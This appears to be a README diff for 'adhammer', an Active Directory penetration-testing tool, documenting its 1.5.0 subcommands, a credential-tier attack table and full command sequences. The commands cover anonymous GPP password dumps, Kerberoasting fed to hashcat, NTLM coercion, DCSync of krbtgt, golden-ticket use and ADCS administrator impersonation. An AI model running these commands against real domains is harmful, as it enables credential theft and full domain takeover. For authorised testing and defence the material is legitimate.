@@ -467,38 +467,99 @@ Run `adhammer` with **no arguments** for the **guided interactive menu** — ask
 
 <br/>
 
-**Power-user subcommands:**
+**Power-user subcommands (full 1.5.0 surface):**
 
 ```
+run    [--web] [--deep]                     no-cred black-box: DNS SRV -> web fingerprint -> anon SMB posture
 scan                                        passive audit -> JSON/HTML (+ --sysvol, --bloodhound out.zip)
 auto                                         guided: scan -> confirm each weakness -> validate + PoC report
-enum   {samr, lsa, net, dns, adcs, esc, posture, sessions}
-                                            RPC / net / ADIDNS / AD-CS / ESC-registry / DC-posture / SRVSVC
-attack {roast, spray, abuse, coerce, rbcd, constrained, unconstrained, dcsync, exec, atexec, wmiexec,
-        secretsdump, gmsa, laps, esc1, esc4, icpr-esc1, golden, silver, pth, asktgt, winrm, capture,
-        poison, relay, zerologon, shadowcred, dcshadow, badsuccessor}
+enum   {samr, lsa, net, dns, adcs, esc, posture, sessions, wkssvc, hku, sccm, scom, krb-users,
+        web, nullbind, rpc-null, shares, host, sysvol}
+                                            new in 1.5.0: web + nullbind + rpc-null + shares --anon +
+                                            host --anon + sysvol (--anon | --user); everything anon-shape
+                                            runs over one login_null SMB session
+attack {roast (hashglass-annotated), spray, abuse, coerce (--scan-all matrix), rbcd, constrained,
+        unconstrained, dcsync, exec, atexec, wmiexec, secretsdump, gmsa, laps, esc1, esc4, icpr-esc1,
+        golden, silver, diamond, pth, asktgt, winrm, capture, poison, relay, zerologon, shadowcred,
+        dcshadow, badsuccessor, mssql, dns, unpac}
 ```
 
+### Attack surface — by credential requirement
+
+Every verb below is honest about what it needs. The 1.5.0 no-cred tier is
+the black-box first-touch capability push; the higher tiers already
+existed in 1.4.x and are unchanged.
+
+| Tier | Requires | Verbs (highlights) | What it reveals / does |
+|:---|:---|:---|:---|
+| **0 · No creds** | just an in-scope IP or realm | `run` (+ `--web`, `--deep`), `enum web` / `nullbind` / `rpc-null` / `shares --anon` / `host --anon` / `sysvol --anon` / `krb-users` | AD DC/KDC/GC via DNS SRV; ADCS ESC8 relay surface (`/certsrv`), RD Web, ADFS, OWA/EWS, SCCM; anon SAMR users, anon srvsvc sessions + shares, anon lsarpc policy; anon GPP `cpassword` (MS14-025) walk over SYSVOL; Kerberos user enum via KDC error codes; AS-REP-roastable users flagged for `attack roast` |
+| **1 · Low-priv (any domain user)** | valid domain cred | `scan`, `enum sessions/wkssvc/hku/dns/adcs/esc/posture/samr/lsa/net/sccm/scom`, `enum sysvol --user X`, `attack roast`, `attack spray`, `attack abuse`, `attack coerce` (+ `--scan-all`) | 58-check LDAP audit + BloodHound-CE export; session hunting from 3 angles; Kerberoast + AS-REP roast (each hash annotated on stderr with its hashcat mode via hashglass); ACL-abuse chains; NTLM coercion 5-vector matrix (PrinterBug / PetitPotam ×2 pipes / DFSCoerce / ShadowyCoerce) |
+| **2 · Admin on target** | local admin or DA | `attack dcsync`, `attack secretsdump`, `attack exec/atexec/wmiexec/winrm`, `attack rbcd/constrained/unconstrained`, `attack shadowcred`, `attack esc1/esc4/icpr-esc1`, `attack laps`, `attack gmsa`, `attack mssql`, `attack dns`, `attack zerologon` (safe-detect), `attack badsuccessor` | remote SAM / LSA / NTDS extract; lateral exec over 4 protocols; delegation abuse (S4U2Self+Proxy); ADCS ESC1/4/6/8/11/15 enrollment via MS-ICPR; LAPS + gMSA password dump; MSSQL over TDS 7.4; Server 2025 dMSA succession (BadSuccessor) |
+| **3 · Crypto material** | krbtgt / TGT / NT hash from tier 2 | `attack golden`, `attack silver`, `attack diamond`, `attack pth`, `attack asktgt`, `attack unpac`, `attack dcshadow` | ticket forgery (golden / silver / diamond); pass-the-hash → session; TGT / TGS request from KDC directly; UnPAC-the-hash; DCShadow persistence (LDAP-path variant dead on 2019+ per [`project-dcshadow-ldap-dead-on-2019plus`](https://github.com/icedracon/adhammer)) |
+
 <details>
-<summary><b>💡 Example commands</b></summary>
+<summary><b>💡 Engagement flow examples (real command sequences)</b></summary>
 <br/>
 
+**First-touch, zero credentials (new in 1.5.0):**
+
 ```sh
-# Audit a domain (low-priv creds are enough), export a BloodHound bundle:
-adhammer scan --url ldaps://dc.corp.local:636 --user 'CORP\svc' --password ... --insecure --bloodhound out.zip
+# Discover DCs by DNS + fingerprint web surface + anon SMB posture per DC, in one shot:
+adhammer run --domain corp.local --range 10.0.0.0/24 --dns-server 10.0.0.1 --web --deep
+
+# Standalone: unified anon posture on one host (enum4linux-ng shape):
+adhammer enum host --anon --host 10.0.0.10
+
+# Anon SYSVOL walk for GPP cpassword — MS14-025 instant creds from zero creds:
+adhammer enum sysvol --anon --host 10.0.0.10 --dump gpp_creds.txt
+
+# ADCS ESC8 relay-surface fingerprint (checks /certsrv, RD Web, ADFS, OWA/EWS, SCCM):
+adhammer enum web --host 10.0.0.10
+
+# Kerberos user enum via pre-auth-less AS-REQ (no LDAP creds needed):
+adhammer enum krb-users --host dc.corp.local --realm CORP.LOCAL --users users.txt
+```
+
+**Low-priv domain user (tier 1):**
+
+```sh
+# Audit a domain, export a BloodHound bundle:
+adhammer scan --url ldaps://dc.corp.local:636 --user 'CORP\svc' --password @file:pw --insecure \
+              --bloodhound out.zip
 
 # ADIDNS + AD CS recon:
-adhammer enum dns  --url ldaps://dc:636 --user 'CORP\svc' --password ... --insecure
-adhammer enum adcs --url ldaps://dc:636 --user 'CORP\svc' --password ... --insecure
+adhammer enum dns  --url ldaps://dc:636 --user 'CORP\svc' --password @file:pw --insecure
+adhammer enum adcs --url ldaps://dc:636 --user 'CORP\svc' --password @file:pw --insecure
 
+# Session hunting from 3 angles (SRVSVC / WKSSVC / HKU registry):
+adhammer enum sessions --host dc --domain CORP --user svc --password env:PW
+adhammer enum wkssvc   --host dc --domain CORP --user svc --password env:PW
+adhammer enum hku      --host dc --domain CORP --user svc --password env:PW
+
+# Authenticated SYSVOL walk (any domain user can read SYSVOL):
+adhammer enum sysvol --host dc --domain CORP --user svc --password env:PW --dump gpp_creds.txt
+
+# Kerberoast + AS-REP roast; every emitted hash carries [hashglass] -m <mode> on stderr:
+adhammer attack roast --url ldaps://dc:636 --user 'CORP\svc' --password env:PW --kdc dc \
+              > hashes.txt 2> hashglass_annotations.txt
+hashcat -m 13100 hashes.txt wordlist.txt   # mode straight from the annotation
+
+# Coercion — try every vector over one login, print a which-fired matrix:
+adhammer attack coerce --scan-all --host dc.corp.local --domain CORP --user svc \
+              --password env:PW --listener 10.99.99.99
+```
+
+**Admin on target (tier 2) + crypto material (tier 3):**
+
+```sh
 # DCSync the krbtgt key, forge a golden ticket, pass-the-ticket to SYSTEM:
-adhammer attack dcsync --host dc --domain CORP --user Administrator --password ... --target krbtgt
+adhammer attack dcsync --host dc --domain CORP --user Administrator --password env:PW --target krbtgt
 adhammer attack pth    --host dc --realm CORP.LOCAL --krbtgt-aes256 <64-hex> --domain-sid S-1-5-21-... \
                        --spn cifs/dc.corp.local --command whoami
 
 # AD CS ESC1 / ESC3 / ESC6 / ESC15 enrollment via MS-ICPR:
 adhammer attack icpr-esc1 --ca CORP-CA --template User --target-upn administrator@corp.local \
-                        --host dc --domain CORP --user 'CORP\svc' --password ... \
+                        --host dc --domain CORP --user 'CORP\svc' --password env:PW \
                         --esc esc6 --san-upn administrator@corp.local
 
 # Server 2025 dMSA succession (BadSuccessor):
@@ -506,6 +567,26 @@ adhammer attack badsuccessor --dmsa-name pwn --target <victim>
 ```
 
 </details>
+
+### Reading the output — exposed vs refused = both are findings
+
+Every no-cred `enum` verb reports the DC's posture symmetrically:
+
+- **exposed:** `[ANON EXPOSED]` marker + the actual enumerated data.
+  Actionable — the DC permits anonymous access to a surface that should
+  be restricted (`RestrictAnonymous=1`, `RestrictNullSessAccess=1`,
+  disable `SYSVOL` anon read).
+- **refused:** the verb reports the exact NTSTATUS / RPC fault
+  (`0xc000006d` null session refused, `0xc0000022` access denied,
+  `BIND_NAK reason=8`, etc.) as a **hardened-posture finding**, not an
+  error. The refused pattern is diagnostic — e.g. Server 2025 DC01
+  blocks anon SAMR (`0xc0000022`) but exposes srvsvc/wkssvc/lsarpc =
+  selective hardening, worth noting in the report.
+
+Same shape for `attack coerce --scan-all`: every vector's outcome is
+recorded — accepted (fired) or the exact wire refusal (RPC timeout /
+`STATUS_OBJECT_NAME_NOT_FOUND` / BIND context reject / BIND_NAK) —
+so the operator sees exactly what's hardened and what isn't.
 
 <br/>
 
